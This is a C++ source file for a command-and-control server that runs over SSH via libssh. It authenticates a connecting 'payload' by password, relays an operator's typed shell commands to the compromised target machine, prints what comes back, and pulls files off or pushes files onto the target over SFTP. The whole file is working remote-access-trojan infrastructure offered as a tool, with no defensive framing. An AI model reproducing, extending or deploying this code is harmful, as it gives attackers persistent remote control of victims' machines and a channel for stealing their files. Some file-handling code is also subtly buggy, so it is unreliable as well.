//
// Created by rip on 6/30/19.
//

#include "C2Server.h"

// Public methods

C2Server::C2Server()
{
    std::cout << "[+] Creating C2 server...\n";

    // create the SSH bind object
    bind = ssh_bind_new();
    if (bind == nullptr)
    {
        std::cerr << "[-] Couldn't create SSH bind\n";
        exit(EXIT_FAILURE);
    }

    // configure the options
    ssh_bind_options_set(bind, SSH_BIND_OPTIONS_BINDADDR, host.c_str());
    ssh_bind_options_set(bind, SSH_BIND_OPTIONS_BINDPORT, &port);
    ssh_bind_options_set(bind, SSH_BIND_OPTIONS_RSAKEY, KEYS_FOLDER "id_rsa");
}

C2Server::~C2Server()
{
    listenerThread.join();
    tearDown();
}

void C2Server::start()
{
    if (ssh_bind_listen(bind) < 0)
    {
        std::cerr << "[-] Error listening on socket: " << ssh_get_error(bind) << std::endl;
        tearDown();
        exit(EXIT_FAILURE);
    }
    std::cout << "[+] SSH server listening on " << host << ":" << port << "...\n";
    isListening = true;

    // wait for connections in a separate thread
    listenerThread = std::thread(&C2Server::listen, this);
}

void C2Server::stop()
{
    isListening = false;
    tearDown();
    std::cout << "[+] C2 server stopped.\n";
}

// Private Methods

void C2Server::listen()
{
    // accept incoming connections
    while (isListening)
    {
        // create new session
        session = ssh_new();
        if (session == nullptr)
        {
            std::cerr << "[-] Couldn't create SSH session\n";
            continue;
        }

        // block until there's a new incoming connection
        if (ssh_bind_accept(this->bind, session) != SSH_ERROR)
        {
            // we got a new connection
            handleConnection();
        }

        std::cout << "[+] Listening again...\n";
    }
}

void C2Server::handleConnection()
{
    std::cout << "[+] Exchanging SSH key...\n";
    if (ssh_handle_key_exchange(session)) {
        std::cerr << "[-] SSH key exchange error: " << std::string(ssh_get_error(session));
        stop();
        return;
    }

    // authenticate the connection
    std::cout << "[+] Authenticating payload...\n";
    if (!authenticate()) {
        std::cerr << "[-] Authentication failed - incorrect user or pwd\n";
        stop();
        return;
    }

    // get a communication channel to the client
    std::cout << "[+] Opening communication channel...\n";
    if (!openChannel())
    {
        std::cerr << "[-] Session closed without opening a channel\n";
        tearDown();
        return;
    }


    // main loop for communication
    std::string input;
    while (true)
    {
        // request input
        std::cout << "[+] CMD > ";
        getline(std::cin, input);

        // and take corresponding actions
        // depending on the command
        if (input == "quit")
        {
            sendMsg(input);
            std::cout << "[+] Quitting communication to payload due to user cmd.\n";
            break;
        }
        else if (startsWith(input, "upload"))
        {
            auto tokens = tokenize(input);
            if (tokens.size() != 3)
            {
                std::cerr << "[-] Incorrect upload syntax.\n";
                continue;
            }
            sendMsg(input);
            handleUpload(tokens[1], tokens[2]);
        }
        else if (startsWith(input, "download"))
        {
            auto tokens = tokenize(input);
            if (tokens.size() != 3)
            {
                std::cerr << "[-] Incorrect download syntax.\n";
                continue;
            }
            sendMsg(input);
            handleDownload(tokens[1], tokens[2]);
        }
        else
        {
            // send cmd to client
            sendMsg(input);

            // and get command output from payload
            std::cout << "[+] Got response from payload:\n" << trimEndNewLine(rcvMsg()) << std::endl;
        }
    }
}

void C2Server::tearDown()
{
    // stop listening if not stopped yet
    isListening = false;

    // free all the objects
    if (channel != nullptr)
    {
        if (ssh_channel_is_open(channel))
        {
            ssh_channel_send_eof(channel);
            ssh_channel_close(channel);
        }
        ssh_channel_free(channel);
    }
    if (session != nullptr)
    {
        ssh_free(session);
    }
    if (bind != nullptr)
    {
        ssh_bind_free(bind);
        ssh_finalize();
    }
}

bool C2Server::authenticate()
{
    ssh_message msg;
    while ((msg = ssh_message_get(session)))
    {
        if (ssh_message_type(msg) == SSH_REQUEST_AUTH && ssh_message_subtype(msg) == SSH_AUTH_METHOD_PASSWORD)
        {
            if (ssh_message_auth_user(msg) == user && ssh_message_auth_password(msg) == pwd)
            {
                // send back successful auth message
                ssh_message_auth_reply_success(msg, 0);
                ssh_message_free(msg);
                return true;
            }
        }

        // not authenticated, return default message
        ssh_message_auth_set_methods(msg, SSH_AUTH_METHOD_PASSWORD);
        ssh_message_reply_default(msg);
        ssh_message_free(msg);
    }
    return false;
}

bool C2Server::openChannel()
{
    ssh_message msg;
    while ((msg = ssh_message_get(session)))
    {
        if (ssh_message_type(msg) == SSH_REQUEST_CHANNEL_OPEN && ssh_message_subtype(msg) == SSH_CHANNEL_SESSION)
        {
            // channel opened
            channel = ssh_message_channel_request_open_reply_accept(msg);
            ssh_message_free(msg);
            return true;
        }
        ssh_message_reply_default(msg);
        ssh_message_free(msg);
    }
    return false;
}

void C2Server::sendMsg(const std::string& msg)
{
    if ((ssh_channel_write(channel, msg.c_str(), (unsigned int) strlen(msg.c_str()))) == SSH_ERROR)
    {
        std::cerr << "[-] Error while writing to channel\n";
    }
}

std::string C2Server::rcvMsg()
{
    char buffer[MAX_BUFF_SIZE] { 0 };
    if ((ssh_channel_read(channel, buffer, sizeof(buffer), 0)) <= 0)
    {
        std::cerr << "[-] Error while reading from channel\n";
    }
    return std::string(buffer);
}

void C2Server::handleUpload(std::string& localFilePath, std::string& remoteFilePath)
{
    std::cout << "[+] Starting upload from target machine (" << localFilePath
              << ") and saving as (" << remoteFilePath << ")\n";

    // make upload directory if it doesn't exist yet
    auto dirName = "uploads";
    if (!dirExists(dirName))
    {
        if (mkdir(dirName, 0777) == -1)
        {
            std::cout << "[-] Error creating uploads directory!\n";
        }
    }

    sftp_session sftp;
    if (!(sftp = setupSFTP()))
    {
        std::cerr << "[-] Error setting up SFTP.\n";
        return;
    }

    sftp_client_message msg;
    while ((msg = sftp_get_client_message(sftp)))
    {
        switch (sftp_client_message_get_type(msg))
        {
            case SSH_FXP_OPEN:
                handleFileOpen(msg);
                break;
            case SSH_FXP_WRITE:;
                handleFileWrite(msg);
                break;
            case SSH_FXP_CLOSE:
                handleFileClose(msg);
                break;
            default:
                /* unsupported type, nothing to do */
                break;
        }

        // free resources
        sftp_client_message_free(msg);
    }
}

void C2Server::handleDownload(std::string& remoteFilePath, std::string& localFilePath)
{
    std::cout << "[+] Starting download of (" << remoteFilePath
              << ") and saving as (" << localFilePath << ") on the target machine.\n";

    sftp_session sftp;
    if (!(sftp = setupSFTP()))
    {
        std::cerr << "[-] Error setting up SFTP.\n";
        return;
    }

    sftp_client_message msg;
    while ((msg = sftp_get_client_message(sftp)))
    {
        switch (sftp_client_message_get_type(msg))
        {
            case SSH_FXP_OPEN:
                handleFileOpen(msg);
                break;
            case SSH_FXP_READ:
                handleFileRead(msg);
                break;
            case SSH_FXP_CLOSE:
                handleFileClose(msg);
                break;
            default:
                /* unsupported type, nothing to do */
                break;
        }

        // free resources
        sftp_client_message_free(msg);
    }
}

sftp_session C2Server::setupSFTP()
{
    ssh_message msg;
    ssh_channel sftpChannel = nullptr;
    sftp_session sftp = nullptr;

    while ((msg = ssh_message_get(session)))
    {
        // open new channel for SFTP
        if (ssh_message_type(msg) == SSH_REQUEST_CHANNEL_OPEN && ssh_message_subtype(msg) == SSH_CHANNEL_SESSION)
        {
            sftpChannel = ssh_message_channel_request_open_reply_accept(msg);
        }

        // wait for the subsystem request to initiate SFTP
        if (sftpChannel != nullptr && ssh_message_type(msg) == SSH_REQUEST_CHANNEL && ssh_message_subtype(msg) == SSH_CHANNEL_REQUEST_SUBSYSTEM)
        {
            if (!strcmp(ssh_message_channel_request_subsystem(msg), "sftp"))
            {
                ssh_message_channel_request_reply_success(msg);

                // create and init SFTP session
                sftp = sftp_server_new(session, sftpChannel);
                if (sftp == nullptr)
                {
                    std::cerr << "[-] Error allocating SFTP session: " + std::string(ssh_get_error(session));
                    return nullptr;
                }
                int rc = sftp_server_init(sftp);
                if (rc != SSH_OK)
                {
                    std::cerr << "[-] Error initializing SFTP session.\n";
                    sftp_free(sftp);
                    return nullptr;
                }

                return sftp;
            }
        }
    }
    return nullptr;
}

void C2Server::handleFileOpen(const sftp_client_message& msg)
{
    auto path = sftp_client_message_get_filename(msg);
    auto flags = convertFlags(sftp_client_message_get_flags(msg));

    // add prefix for the uploads folder if we're
    // opening for uploading (= writing the file)
    if (flags & O_WRONLY)
    {
        path = ("uploads/" + std::string(path)).c_str();
    }

    // open the file and get fd
    int fd = open(path, flags, 0666);
    if (fd < 0)
    {
        std::cerr << "[-] Opening file \"" << path << "\" failed with error " << errno << std::endl;
        sftp_reply_status(msg, SSH_FX_FAILURE, "Failure");
        return;
    }
    auto fdStr = std::to_string(fd);
    auto handle = ssh_string_from_char(fdStr.c_str());

    // send handle
    sftp_reply_handle(msg, handle);

    // free resources
    ssh_string_free(handle);
}

void C2Server::handleFileWrite(const sftp_client_message& msg)
{
    auto fd = convertHandleToFileDescriptor(msg->handle);

    // write data
    auto data = sftp_client_message_get_data(msg);
    auto ret = write(fd, data, strlen(data));
    if (ret < 0)
    {
        std::cerr << "[-] Error while writing to file.\n";
        sftp_reply_status(msg, SSH_FX_FAILURE, "Failure");
        return;
    }
    sftp_reply_status(msg, SSH_FX_OK, "Success");
}

void C2Server::handleFileRead(const sftp_client_message& msg)
{
    char buffer[MAX_BUFF_SIZE];
    auto fd = convertHandleToFileDescriptor(msg->handle);

    // read data
    auto ret = read(fd, buffer, msg->len);
    if (ret < 0)
    {
        std::cerr << "[-] Error while reading from file.\n";
        sftp_reply_status(msg, SSH_FX_FAILURE, "Failure");
        return;
    }

    // send data
    sftp_reply_data(msg, buffer, msg->len);
    sftp_reply_status(msg, SSH_FX_EOF, "Success");
}

void C2Server::handleFileClose(const sftp_client_message& msg)
{
    auto fd = convertHandleToFileDescriptor(msg->handle);
    if (close(fd) == -1)
    {
        std::cerr << "[-] Closing file handle failed with error " << errno << std::endl;
        sftp_reply_status(msg, SSH_FX_FAILURE, "Failure");
        return;
    }
    sftp_reply_status(msg, SSH_FX_OK, "Success");
}